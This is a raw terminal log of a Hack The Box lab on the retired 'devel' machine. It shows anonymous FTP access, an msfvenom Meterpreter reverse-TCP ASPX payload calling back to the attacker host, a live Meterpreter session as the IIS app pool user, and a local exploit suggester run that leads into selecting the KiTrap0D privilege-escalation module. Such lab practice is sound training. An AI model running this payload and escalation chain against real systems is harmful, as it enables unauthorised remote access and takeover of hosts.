@@ -1,0 +1,877 @@
+arjun@kali:~/Documents/HackTheBox/retired/devel$ ftp 10.10.10.5                                                
+Connected to 10.10.10.5.   
+220 Microsoft FTP Service  
+Name (10.10.10.5:arjun): anonymous                     
+331 Anonymous access allowed, send identity (e-mail name) as password.                                         
+Password:                  
+230 User logged in.        
+Remote system type is Windows_NT.                      
+ftp> ls                    
+200 PORT command successful.                           
+125 Data connection already open; Transfer starting.   
+03-18-17  02:06AM       <DIR>          aspnet_client   
+03-17-17  05:37PM                  689 iisstart.htm    
+03-17-17  05:37PM               184946 welcome.png     
+226 Transfer complete.     
+ftp> ls                    
+200 PORT command successful.                           
+125 Data connection already open; Transfer starting.   
+03-18-17  02:06AM       <DIR>          aspnet_client   
+03-17-17  05:37PM                  689 iisstart.htm    
+03-17-17  05:37PM               184946 welcome.png     
+226 Transfer complete.     
+ftp> cd ..                 
+250 CWD command successful.                            
+ftp> ls                    
+200 PORT command successful.                           
+125 Data connection already open; Transfer starting.   
+03-18-17  02:06AM       <DIR>          aspnet_client   
+03-17-17  05:37PM                  689 iisstart.htm    
+03-17-17  05:37PM               184946 welcome.png     
+226 Transfer complete.     
+ftp> cd aspnet_Client      
+250 CWD command successful.                            
+ftp> ls                    
+200 PORT command successful.                           
+125 Data connection already open; Transfer starting.   
+03-18-17  02:06AM       <DIR>          system_web      
+226 Transfer complete.     
+ftp> cd system_web         
+250 CWD command successful.                            
+ftp> ls                    
+200 PORT command successful.                           
+125 Data connection already open; Transfer starting.   
+03-18-17  02:06AM       <DIR>          2_0_50727       
+226 Transfer complete.     
+ftp> cd 2_0_50727          
+250 CWD command successful.                            
+ftp> ls                    
+200 PORT command successful.                           
+125 Data connection already open; Transfer starting.   
+226 Transfer complete.     
+ftp> ls -al                
+200 PORT command successful.                           
+125 Data connection already open; Transfer starting.   
+226 Transfer complete.     
+ftp> cd ..                 
+250 CWD command successful.                            
+ftp> cd ..                 
+250 CWD command successful.                            
+ftp> ls                    
+200 PORT command successful.                           
+125 Data connection already open; Transfer starting.   
+03-18-17  02:06AM       <DIR>          system_web      
+226 Transfer complete.     
+ftp> cd ..                 
+250 CWD command successful.                            
+ftp> ls                    
+200 PORT command successful.                           
+125 Data connection already open; Transfer starting.   
+03-18-17  02:06AM       <DIR>          aspnet_client   
+03-17-17  05:37PM                  689 iisstart.htm    
+03-17-17  05:37PM               184946 welcome.png     
+226 Transfer complete.     
+ftp> ls                    
+200 PORT command successful.                           
+125 Data connection already open; Transfer starting.   
+03-18-17  02:06AM       <DIR>          aspnet_client   
+03-17-17  05:37PM                  689 iisstart.htm    
+03-17-17  05:37PM               184946 welcome.png     
+226 Transfer complete.     
+ftp> exit                  
+421 Service not available, remote server has closed connection                                                 
+arjun@kali:~/Documents/HackTheBox/retired/devel$ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.19 LPORT=9001 -f aspx > ex.aspx
+[sudo] password for arjun:                             
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                         
+[-] No arch selected, selecting arch: x86 from the payload                                                     
+No encoder or badchars specified, outputting raw payload                                                       
+Payload size: 341 bytes    
+Final size of aspx file: 2798 bytes                    
+arjun@kali:~/Documents/HackTheBox/retired/devel$ vim ex.aspx                                                   
+arjun@kali:~/Documents/HackTheBox/retired/devel$ sudo msfconsole                                               
+[-] ***rting the Metasploit Framework console...\      
+[-] * WARNING: No database support: No database YAML file                                                      
+[-] ***                    
+                                                       
+
+                 _---------.                           
+             .' #######   ;."                          
+  .---,.    ;@             @@`;   .---,..              
+." @@@@@'.,'@@            @@@@@',.'@@@@ ".             
+'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;             
+   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'             
+     "--'.@@@  -.@        @ ,'-   .'--"                
+          ".@' ; @       @ `.  ;'                      
+            |@@@@ @@@     @    .                       
+             ' @@@ @@   @@    ,                        
+              `.@@@@    @@   .                         
+                ',@@     @   ;           _____________ 
+                 (   3 C    )     /|___ / Metasploit! \                                                        
+                 ;@'. __*__,."    \|--- \_____________/                                                        
+                  '(.,...."/                           
+
+
+       =[ metasploit v5.0.76-dev                          ]                                                    
++ -- --=[ 1971 exploits - 1088 auxiliary - 339 post       ]                                                    
++ -- --=[ 558 payloads - 45 encoders - 10 nops            ]                                                    
++ -- --=[ 7 evasion                                       ]                                                    
+
+msf5 > use exploit/multi/h 
+Display all 200 possibilities? (y or n)                
+msf5 > use exploit/multi/handler                       
+msf5 exploit(multi/handler) > options                  
+
+Module options (exploit/multi/handler):                
+
+   Name  Current Setting  Required  Description        
+   ----  ---------------  --------  -----------        
+
+
+Exploit target:            
+
+   Id  Name                
+   --  ----                
+   0   Wildcard Target     
+
+
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp                                      
+payload => windows/meterpreter/reverse_tcp             
+msf5 exploit(multi/handler) > options                  
+
+Module options (exploit/multi/handler):                
+
+   Name  Current Setting  Required  Description        
+   ----  ---------------  --------  -----------        
+
+
+Payload options (windows/meterpreter/reverse_tcp):     
+
+   Name      Current Setting  Required  Description    
+   ----      ---------------  --------  -----------    
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)              
+   LHOST                      yes       The listen address (an interface may be specified)                     
+   LPORT     4444             yes       The listen port                                                        
+
+
+Exploit target:            
+
+   Id  Name                
+   --  ----                
+   0   Wildcard Target     
+
+
+msf5 exploit(multi/handler) > set LPORT 9001           
+LPORT => 9001              
+msf5 exploit(multi/handler) > run                      
+
+[-] Exploit failed: The following options failed to validate: LHOST.                                           
+[*] Exploit completed, but no session was created.     
+msf5 exploit(multi/handler) > set LHOST 10.10.14.19    
+LHOST => 10.10.14.19       
+msf5 exploit(multi/handler) > run                      
+
+[-] Handler failed to bind to 10.10.14.19:9001:-  -    
+[*] Started reverse TCP handler on 0.0.0.0:9001        
+^C[-] Exploit failed [user-interrupt]: Interrupt        
+[-] run: Interrupted                                    
+msf5 exploit(multi/handler) > eixt                      
+exit                                                    
+[-] Unknown command: eixt.                              
+msf5 exploit(multi/handler) > exit                      
+arjun@kali:~/Documents/HackTheBox/retired/devel$ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=9001 -f aspx > ex.aspx                                                                                    
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                         
+[-] No arch selected, selecting arch: x86 from the payload                                                     
+No encoder or badchars specified, outputting raw payload                                                       
+Payload size: 341 bytes                                 
+Final size of aspx file: 2795 bytes                     
+arjun@kali:~/Documents/HackTheBox/retired/devel$ sudo msfconsole                                               
+[-] ***rting the Metasploit Framework console...-       
+[-] * WARNING: No database support: No database YAML file                                                      
+[-] ***                                                 
+                                                        
+               .;lxO0KXXXK0Oxl:.                        
+           ,o0WMMMMMMMMMMMMMMMMMMKd,                    
+        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,                 
+      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:               
+    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,             
+   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo            
+  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk           
+ oMMMMMMMMMMx.                    dMMMMMMMMMMx          
+.WMMMMMMMMM:                       :MMMMMMMMMM,         
+xMMMMMMMMMo                         lMMMMMMMMMO         
+NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;  
+MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:   
+NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:     
+xMMMMMMMMMd                        ,0MMMMMMMMMMK;       
+.WMMMMMMMMMc                         'OMMMMMM0,         
+ lMMMMMMMMMMk.                         .kMMO'           
+  dMMMMMMMMMMWd'                         ..             
+   cWMMMMMMMMMMMNxc'.                ##########         
+    .0MMMMMMMMMMMMMMMMWc            #+#    #+#          
+      ;0MMMMMMMMMMMMMMMo.          +:+                  
+        .dNMMMMMMMMMMMMo          +#++:++#+             
+           'oOWMMMMMMMMo                +:+             
+               .,cdkO0K;        :+:    :+:                                                                     
+                                :::::::+:               
+                      Metasploit                        
+
+       =[ metasploit v5.0.76-dev                          ]                                                    
++ -- --=[ 1971 exploits - 1088 auxiliary - 339 post       ]                                                    
++ -- --=[ 558 payloads - 45 encoders - 10 nops            ]                                                    
++ -- --=[ 7 evasion                                       ]                                                    
+
+msf5 > use multi/handler                                
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp                                      
+payload => windows/meterpreter/reverse_tcp              
+msf5 exploit(multi/handler) > set LHOST 10.10.14.7      
+LHOST => 10.10.14.7                                     
+msf5 exploit(multi/handler) > set LPORT 9001            
+LPORT => 9001                                           
+msf5 exploit(multi/handler) > run                       
+
+[*] Started reverse TCP handler on 10.10.14.7:9001      
+^[[1[*] Sending stage (180291 bytes) to 10.10.10.5      
+[*] Meterpreter session 1 opened (10.10.14.7:9001 -> 10.10.10.5:49160) at 2020-05-11 12:19:30 -0500            
+
+meterpreter >                                           
+[*] 10.10.10.5 - Meterpreter session 1 closed.  Reason: Died                                                   
+Interrupt: use the 'exit' command to quit               
+meterpreter > run                                       
+Usage: run <script> [arguments]                         
+
+Executes a ruby script or Metasploit Post module in the context of the                                         
+meterpreter session.  Post modules can take arguments in var=val format.                                       
+Example: run post/foo/bar BAZ=abcd                      
+
+msf5 exploit(multi/handler) > run                       
+
+[*] Started reverse TCP handler on 10.10.14.7:9001      
+[*] Sending stage (180291 bytes) to 10.10.10.5          
+[*] Meterpreter session 2 opened (10.10.14.7:9001 -> 10.10.10.5:49161) at 2020-05-11 12:21:34 -0500            
+
+meterpreter > getuid                                    
+Server username: IIS APPPOOL\Web                        
+meterpreter > ps                                        
+
+Process List                                            
+============                                            
+
+ PID   PPID  Name                  Arch  Session  User             Path                                        
+ ---   ----  ----                  ----  -------  ----             ----                                        
+ 0     0     [System Process]                                                                                  
+ 4     0     System                                                                                            
+ 264   4     smss.exe                                                                                          
+ 348   340   csrss.exe                                                                                         
+ 388   340   wininit.exe                                                                                       
+ 396   380   csrss.exe                                                                                         
+ 444   380   winlogon.exe                                                                                      
+ 488   388   services.exe                                                                                      
+ 496   388   lsass.exe                                                                                         
+ 504   388   lsm.exe                                                                                           
+ 608   488   svchost.exe                                                                                       
+ 672   488   svchost.exe                                                                                       
+ 724   488   svchost.exe                                                                                       
+ 796   444   LogonUI.exe                                                                                       
+ 844   488   svchost.exe                                                                                       
+ 888   488   svchost.exe                                                                                       
+ 996   488   svchost.exe                                                                                       
+ 1068  488   svchost.exe                                                                                       
+ 1112  1564  w3wp.exe              x86   0        IIS APPPOOL\Web  c:\windows\system32\inetsrv\w3wp.exe        
+ 1176  488   spoolsv.exe                                                                                       
+ 1212  488   svchost.exe                                                                                       
+ 1300  488   svchost.exe                                                                                       
+ 1364  488   svchost.exe                                                                                       
+ 1416  488   svchost.exe                                                                                       
+ 1500  488   msdtc.exe                                                                                         
+ 1504  488   VGAuthService.exe                                                                                 
+ 1532  488   vmtoolsd.exe                                                                                      
+ 1564  488   svchost.exe                                                                                       
+ 1900  488   TrustedInstaller.exe                                                                              
+ 1996  608   WmiPrvSE.exe                                                                                      
+ 2780  488   sppsvc.exe                                                                                        
+ 2820  488   svchost.exe                                                                                       
+ 2892  488   SearchIndexer.exe                                                                                 
+
+meterpreter > ls           
+Listing: c:\windows\system32\inetsrv                                                                           
+====================================                   
+
+Mode              Size     Type  Last modified              Name                                               
+----              ----     ----  -------------              ----                                               
+100666/rw-rw-rw-  138752   fil   2009-07-13 19:11:35 -0500  AppHostNavigators.dll                              
+100777/rwxrwxrwx  125440   fil   2009-07-13 19:10:51 -0500  InetMgr.exe                                        
+100666/rw-rw-rw-  126976   fil   2009-07-13 17:39:34 -0500  Microsoft.Web.Administration.dll                   
+100666/rw-rw-rw-  1048576  fil   2009-07-13 17:39:42 -0500  Microsoft.Web.Management.dll                       
+100666/rw-rw-rw-  137728   fil   2009-07-13 19:11:35 -0500  XPath.dll                                          
+100777/rwxrwxrwx  155648   fil   2009-07-13 19:11:25 -0500  appcmd.exe                                         
+100666/rw-rw-rw-  3654     fil   2009-06-10 16:17:16 -0500  appcmd.xml                                         
+100666/rw-rw-rw-  61440    fil   2009-07-13 19:11:12 -0500  apphostsvc.dll                                     
+100666/rw-rw-rw-  313856   fil   2009-07-13 19:11:17 -0500  appobj.dll                                         
+100666/rw-rw-rw-  389632   fil   2009-07-13 19:11:14 -0500  asp.dll                                            
+100666/rw-rw-rw-  22196    fil   2009-07-13 16:04:57 -0500  asp.mof                                            
+100777/rwxrwxrwx  195584   fil   2009-07-13 19:11:42 -0500  aspnetca.exe                                       
+100666/rw-rw-rw-  22528    fil   2009-07-13 19:10:58 -0500  asptlb.tlb                                         
+100666/rw-rw-rw-  32256    fil   2009-07-13 19:11:17 -0500  authanon.dll                                       
+100666/rw-rw-rw-  48640    fil   2009-07-13 19:11:01 -0500  browscap.dll                                       
+100666/rw-rw-rw-  33404    fil   2017-03-17 09:37:32 -0500  browscap.ini                                       
+100666/rw-rw-rw-  17408    fil   2009-07-13 19:11:22 -0500  cachfile.dll                                       
+100666/rw-rw-rw-  44544    fil   2009-07-13 19:11:28 -0500  cachhttp.dll                                       
+100666/rw-rw-rw-  10240    fil   2009-07-13 19:11:27 -0500  cachtokn.dll                                       
+100666/rw-rw-rw-  9728     fil   2009-07-13 19:11:27 -0500  cachuri.dll                                        
+100666/rw-rw-rw-  43520    fil   2009-07-13 19:11:22 -0500  compstat.dll                                       
+40777/rwxrwxrwx   4096     dir   2017-03-17 09:37:32 -0500  config                                             
+100666/rw-rw-rw-  41984    fil   2009-07-13 19:11:21 -0500  custerr.dll                                        
+100666/rw-rw-rw-  19456    fil   2009-07-13 19:11:22 -0500  defdoc.dll                                         
+100666/rw-rw-rw-  23552    fil   2009-07-13 19:11:22 -0500  dirlist.dll                                        
+40777/rwxrwxrwx   4096     dir   2017-03-17 09:37:32 -0500  en-US                                              
+100666/rw-rw-rw-  55808    fil   2009-07-13 19:11:24 -0500  filter.dll                                         
+100666/rw-rw-rw-  16384    fil   2009-07-13 19:11:29 -0500  ftpconfigext.dll                                   
+100666/rw-rw-rw-  9728     fil   2009-07-13 19:11:28 -0500  ftpctrlps.dll                                      
+100666/rw-rw-rw-  10240    fil   2009-07-13 19:11:29 -0500  ftpmib.dll                                         
+100666/rw-rw-rw-  14848    fil   2009-07-13 19:11:29 -0500  ftpres.dll                                         
+100666/rw-rw-rw-  308224   fil   2009-07-13 19:11:36 -0500  ftpsvc.dll                                         
+100666/rw-rw-rw-  69252    fil   2009-07-13 17:40:37 -0500  ftpsvc.mof                                         
+100666/rw-rw-rw-  27136    fil   2009-07-13 19:10:58 -0500  gzip.dll                                           
+100666/rw-rw-rw-  22528    fil   2009-07-13 19:11:09 -0500  httpmib.dll                                        
+100666/rw-rw-rw-  12800    fil   2009-07-13 19:11:17 -0500  hwebcore.dll                                       
+100666/rw-rw-rw-  63105    fil   2009-07-13 17:39:38 -0500  iis.msc                                            
+100666/rw-rw-rw-  197632   fil   2009-07-13 19:11:24 -0500  iiscore.dll                                        
+100666/rw-rw-rw-  89088    fil   2009-07-13 19:11:33 -0500  iisreg.dll                                         
+100666/rw-rw-rw-  12288    fil   2009-07-13 19:11:26 -0500  iisreqs.dll                                        
+100666/rw-rw-rw-  220160   fil   2009-07-13 19:11:11 -0500  iisres.dll                                         
+100777/rwxrwxrwx  30720    fil   2009-07-13 19:11:04 -0500  iisrstas.exe                                       
+100777/rwxrwxrwx  240128   fil   2009-07-13 19:11:45 -0500  iissetup.exe                                       
+100666/rw-rw-rw-  59904    fil   2009-07-13 19:11:36 -0500  iissyspr.dll                                       
+100666/rw-rw-rw-  205824   fil   2009-07-13 19:11:15 -0500  iisutil.dll                                        
+100666/rw-rw-rw-  396288   fil   2009-07-13 19:11:15 -0500  iisw3adm.dll                                       
+100666/rw-rw-rw-  106496   fil   2009-07-13 19:11:24 -0500  isapi.dll                                          
+100666/rw-rw-rw-  19456    fil   2009-07-13 19:11:23 -0500  loghttp.dll                                        
+100666/rw-rw-rw-  39424    fil   2009-07-13 19:11:26 -0500  modrqflt.dll                                       
+100666/rw-rw-rw-  363008   fil   2009-07-13 19:11:24 -0500  nativerd.dll                                       
+100666/rw-rw-rw-  19968    fil   2009-07-13 19:11:24 -0500  protsup.dll                                        
+100666/rw-rw-rw-  26624    fil   2009-07-13 19:11:11 -0500  rsca.dll                                           
+100666/rw-rw-rw-  49664    fil   2009-07-13 19:11:14 -0500  rscaext.dll                                        
+100666/rw-rw-rw-  37888    fil   2009-07-13 19:11:28 -0500  static.dll                                         
+100666/rw-rw-rw-  18944    fil   2009-07-13 19:11:22 -0500  validcfg.dll                                       
+100666/rw-rw-rw-  9216     fil   2009-07-13 19:11:07 -0500  w3ctrlps.dll                                       
+100666/rw-rw-rw-  30208    fil   2009-07-13 19:11:09 -0500  w3ctrs.dll                                         
+100666/rw-rw-rw-  24064    fil   2009-07-13 19:11:18 -0500  w3dt.dll                                           
+100666/rw-rw-rw-  15872    fil   2009-07-13 19:11:15 -0500  w3tp.dll                                           
+100777/rwxrwxrwx  20480    fil   2009-07-13 19:11:23 -0500  w3wp.exe                                           
+100666/rw-rw-rw-  55296    fil   2009-07-13 19:11:16 -0500  w3wphost.dll                                       
+100666/rw-rw-rw-  23552    fil   2009-07-13 19:11:13 -0500  wbhst_pm.dll                                       
+100666/rw-rw-rw-  24064    fil   2009-07-13 19:11:09 -0500  wbhstipm.dll                                       
+
+meterpreter > cd C:\       
+ > Interrupt: use the 'exit' command to quit           
+meterpreter > cd C:        
+meterpreter > ls           
+Listing: c:\windows\system32\inetsrv                   
+====================================                   
+
+Mode              Size     Type  Last modified              Name                                               
+----              ----     ----  -------------              ----                                               
+100666/rw-rw-rw-  138752   fil   2009-07-13 19:11:35 -0500  AppHostNavigators.dll                              
+100777/rwxrwxrwx  125440   fil   2009-07-13 19:10:51 -0500  InetMgr.exe                                        
+100666/rw-rw-rw-  126976   fil   2009-07-13 17:39:34 -0500  Microsoft.Web.Administration.dll                   
+100666/rw-rw-rw-  1048576  fil   2009-07-13 17:39:42 -0500  Microsoft.Web.Management.dll                       
+100666/rw-rw-rw-  137728   fil   2009-07-13 19:11:35 -0500  XPath.dll                                          
+100777/rwxrwxrwx  155648   fil   2009-07-13 19:11:25 -0500  appcmd.exe                                         
+100666/rw-rw-rw-  3654     fil   2009-06-10 16:17:16 -0500  appcmd.xml                                         
+100666/rw-rw-rw-  61440    fil   2009-07-13 19:11:12 -0500  apphostsvc.dll                                     
+100666/rw-rw-rw-  313856   fil   2009-07-13 19:11:17 -0500  appobj.dll                                         
+100666/rw-rw-rw-  389632   fil   2009-07-13 19:11:14 -0500  asp.dll                                            
+100666/rw-rw-rw-  22196    fil   2009-07-13 16:04:57 -0500  asp.mof                                            
+100777/rwxrwxrwx  195584   fil   2009-07-13 19:11:42 -0500  aspnetca.exe                                       
+100666/rw-rw-rw-  22528    fil   2009-07-13 19:10:58 -0500  asptlb.tlb                                         
+100666/rw-rw-rw-  32256    fil   2009-07-13 19:11:17 -0500  authanon.dll                                       
+100666/rw-rw-rw-  48640    fil   2009-07-13 19:11:01 -0500  browscap.dll                                       
+100666/rw-rw-rw-  33404    fil   2017-03-17 09:37:32 -0500  browscap.ini                                       
+100666/rw-rw-rw-  17408    fil   2009-07-13 19:11:22 -0500  cachfile.dll                                       
+100666/rw-rw-rw-  44544    fil   2009-07-13 19:11:28 -0500  cachhttp.dll                                       
+100666/rw-rw-rw-  10240    fil   2009-07-13 19:11:27 -0500  cachtokn.dll                                       
+100666/rw-rw-rw-  9728     fil   2009-07-13 19:11:27 -0500  cachuri.dll                                        
+100666/rw-rw-rw-  43520    fil   2009-07-13 19:11:22 -0500  compstat.dll                                       
+40777/rwxrwxrwx   4096     dir   2017-03-17 09:37:32 -0500  config                                             
+100666/rw-rw-rw-  41984    fil   2009-07-13 19:11:21 -0500  custerr.dll                                        
+100666/rw-rw-rw-  19456    fil   2009-07-13 19:11:22 -0500  defdoc.dll                                         
+100666/rw-rw-rw-  23552    fil   2009-07-13 19:11:22 -0500  dirlist.dll                                        
+40777/rwxrwxrwx   4096     dir   2017-03-17 09:37:32 -0500  en-US                                              
+100666/rw-rw-rw-  55808    fil   2009-07-13 19:11:24 -0500  filter.dll                                         
+100666/rw-rw-rw-  16384    fil   2009-07-13 19:11:29 -0500  ftpconfigext.dll                                   
+100666/rw-rw-rw-  9728     fil   2009-07-13 19:11:28 -0500  ftpctrlps.dll                                      
+100666/rw-rw-rw-  10240    fil   2009-07-13 19:11:29 -0500  ftpmib.dll                                         
+100666/rw-rw-rw-  14848    fil   2009-07-13 19:11:29 -0500  ftpres.dll                                         
+100666/rw-rw-rw-  308224   fil   2009-07-13 19:11:36 -0500  ftpsvc.dll                                         
+100666/rw-rw-rw-  69252    fil   2009-07-13 17:40:37 -0500  ftpsvc.mof                                         
+100666/rw-rw-rw-  27136    fil   2009-07-13 19:10:58 -0500  gzip.dll                                           
+100666/rw-rw-rw-  22528    fil   2009-07-13 19:11:09 -0500  httpmib.dll                                        
+100666/rw-rw-rw-  12800    fil   2009-07-13 19:11:17 -0500  hwebcore.dll                                       
+100666/rw-rw-rw-  63105    fil   2009-07-13 17:39:38 -0500  iis.msc                                            
+100666/rw-rw-rw-  197632   fil   2009-07-13 19:11:24 -0500  iiscore.dll                                        
+100666/rw-rw-rw-  89088    fil   2009-07-13 19:11:33 -0500  iisreg.dll                                         
+100666/rw-rw-rw-  12288    fil   2009-07-13 19:11:26 -0500  iisreqs.dll                                        
+100666/rw-rw-rw-  220160   fil   2009-07-13 19:11:11 -0500  iisres.dll                                         
+100777/rwxrwxrwx  30720    fil   2009-07-13 19:11:04 -0500  iisrstas.exe                                       
+100777/rwxrwxrwx  240128   fil   2009-07-13 19:11:45 -0500  iissetup.exe                                       
+100666/rw-rw-rw-  59904    fil   2009-07-13 19:11:36 -0500  iissyspr.dll                                       
+100666/rw-rw-rw-  205824   fil   2009-07-13 19:11:15 -0500  iisutil.dll                                        
+100666/rw-rw-rw-  396288   fil   2009-07-13 19:11:15 -0500  iisw3adm.dll                                       
+100666/rw-rw-rw-  106496   fil   2009-07-13 19:11:24 -0500  isapi.dll                                          
+100666/rw-rw-rw-  19456    fil   2009-07-13 19:11:23 -0500  loghttp.dll                                        
+100666/rw-rw-rw-  39424    fil   2009-07-13 19:11:26 -0500  modrqflt.dll                                       
+100666/rw-rw-rw-  363008   fil   2009-07-13 19:11:24 -0500  nativerd.dll                                       
+100666/rw-rw-rw-  19968    fil   2009-07-13 19:11:24 -0500  protsup.dll                                        
+100666/rw-rw-rw-  26624    fil   2009-07-13 19:11:11 -0500  rsca.dll                                           
+100666/rw-rw-rw-  49664    fil   2009-07-13 19:11:14 -0500  rscaext.dll                                        
+100666/rw-rw-rw-  37888    fil   2009-07-13 19:11:28 -0500  static.dll                                         
+100666/rw-rw-rw-  18944    fil   2009-07-13 19:11:22 -0500  validcfg.dll                                       
+100666/rw-rw-rw-  9216     fil   2009-07-13 19:11:07 -0500  w3ctrlps.dll                                       
+100666/rw-rw-rw-  30208    fil   2009-07-13 19:11:09 -0500  w3ctrs.dll                                         
+100666/rw-rw-rw-  24064    fil   2009-07-13 19:11:18 -0500  w3dt.dll                                           
+100666/rw-rw-rw-  15872    fil   2009-07-13 19:11:15 -0500  w3tp.dll                                           
+100777/rwxrwxrwx  20480    fil   2009-07-13 19:11:23 -0500  w3wp.exe                                           
+100666/rw-rw-rw-  55296    fil   2009-07-13 19:11:16 -0500  w3wphost.dll                                       
+100666/rw-rw-rw-  23552    fil   2009-07-13 19:11:13 -0500  wbhst_pm.dll                                       
+100666/rw-rw-rw-  24064    fil   2009-07-13 19:11:09 -0500  wbhstipm.dll                                       
+
+meterpreter > cd /         
+meterpreter > ls           
+Listing: c:\               
+============               
+
+Mode                 Size                Type  Last modified                    Name                           
+----                 ----                ----  -------------                    ----                           
+40777/rwxrwxrwx      0                   dir   2009-07-13 21:36:15 -0500        $Recycle.Bin                   
+40777/rwxrwxrwx      0                   dir   2009-07-13 23:53:55 -0500        Documents and Settings         
+40777/rwxrwxrwx      0                   dir   2009-07-13 21:37:05 -0500        PerfLogs                       
+40555/r-xr-xr-x      4096                dir   2009-07-13 21:37:05 -0500        Program Files                  
+40777/rwxrwxrwx      4096                dir   2009-07-13 21:37:05 -0500        ProgramData                    
+40777/rwxrwxrwx      0                   dir   2017-03-17 09:17:30 -0500        Recovery                       
+40777/rwxrwxrwx      8192                dir   2017-03-17 06:09:34 -0500        System Volume Information      
+40555/r-xr-xr-x      4096                dir   2009-07-13 21:37:05 -0500        Users                          
+40777/rwxrwxrwx      16384               dir   2009-07-13 21:37:05 -0500        Windows                        
+100777/rwxrwxrwx     24                  fil   2009-07-13 21:04:04 -0500        autoexec.bat                   
+100666/rw-rw-rw-     10                  fil   2009-07-13 21:04:04 -0500        config.sys                     
+40777/rwxrwxrwx      4096                dir   2017-03-17 09:37:31 -0500        inetpub                        
+411611620/rw--w----  300888984802852847  fif   9543796666-01-01 22:05:20 -0600  pagefile.sys                   
+
+meterpreter > cd Users     
+meterpreter > ls           
+Listing: c:\Users          
+=================          
+
+Mode              Size  Type  Last modified              Name                                                  
+----              ----  ----  -------------              ----                                                  
+40777/rwxrwxrwx   8192  dir   2017-03-17 18:16:43 -0500  Administrator                                         
+40777/rwxrwxrwx   0     dir   2009-07-13 23:53:55 -0500  All Users                                             
+40777/rwxrwxrwx   8192  dir   2017-03-17 18:06:26 -0500  Classic .NET AppPool                                  
+40555/r-xr-xr-x   8192  dir   2009-07-13 21:37:05 -0500  Default                                               
+40777/rwxrwxrwx   0     dir   2009-07-13 23:53:55 -0500  Default User                                          
+40555/r-xr-xr-x   4096  dir   2009-07-13 21:37:05 -0500  Public                                                
+40777/rwxrwxrwx   8192  dir   2017-03-17 09:17:37 -0500  babis                                                 
+100666/rw-rw-rw-  174   fil   2009-07-13 23:41:57 -0500  desktop.ini                                           
+
+meterpreter > cd babis     
+[-] stdapi_fs_chdir: Operation failed: Access is denied.                                                       
+meterpreter > sys          
+[-] Unknown command: sys.  
+meterpreter > sysinfo      
+Computer        : DEVEL    
+OS              : Windows 7 (6.1 Build 7600).          
+Architecture    : x86      
+System Language : el_GR    
+Domain          : HTB      
+Logged On Users : 0        
+Meterpreter     : x86/windows                          
+meterpreter > search suggester                         
+[-] You must specify a valid file glob to search for, e.g. >search -f *.doc                                    
+meterpreter > background   
+[*] Backgrounding session 2...                         
+msf5 exploit(multi/handler) > search suggester         
+
+Matching Modules           
+================           
+
+   #  Name                                      Disclosure Date  Rank    Check  Description                    
+   -  ----                                      ---------------  ----    -----  -----------                    
+   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester                       
+
+
+msf5 exploit(multi/handler) > use 1                    
+msf5 exploit(multi/handler) > use 0                    
+msf5 post(multi/recon/local_exploit_suggester) > options                                                       
+
+Module options (post/multi/recon/local_exploit_suggester):                                                     
+
+   Name             Current Setting  Required  Description                                                     
+   ----             ---------------  --------  -----------                                                     
+   SESSION                           yes       The session to run this module on                               
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits      
+
+msf5 post(multi/recon/local_exploit_suggester) > sessions                                                      
+
+Active sessions            
+===============            
+
+  Id  Name  Type                     Information              Connection                                       
+  --  ----  ----                     -----------              ----------                                       
+  2         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.7:9001 -> 10.10.10.5:49161 (10.10.10.5) 
+
+msf5 post(multi/recon/local_exploit_suggester) > set SESSION 2                                                 
+SESSION => 2               
+msf5 post(multi/recon/local_exploit_suggester) > run   
+
+[*] 10.10.10.5 - Collecting local exploits for x86/windows...                                                  
+[*] 10.10.10.5 - 30 exploit checks are being tried...  
+[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.                
+[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.  
+[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.              
+[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.              
+[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.         
+[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.         
+[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated. 
+[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.        
+[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.    
+[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.               
+[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.         
+[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.                   
+[*] Post module execution completed                    
+msf5 post(multi/recon/local_exploit_suggester) > search kirap0d                                                
+[-] No results from search 
+msf5 post(multi/recon/local_exploit_suggester) > search kitrap0d                                               
+
+Matching Modules           
+================           
+
+   #  Name                                     Disclosure Date  Rank   Check  Description                      
+   -  ----                                     ---------------  ----   -----  -----------                      
+   0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D                      
+
+
+msf5 post(multi/recon/local_exploit_suggester) > use 0                                                         
+msf5 exploit(windows/local/ms10_015_kitrap0d) > options
+
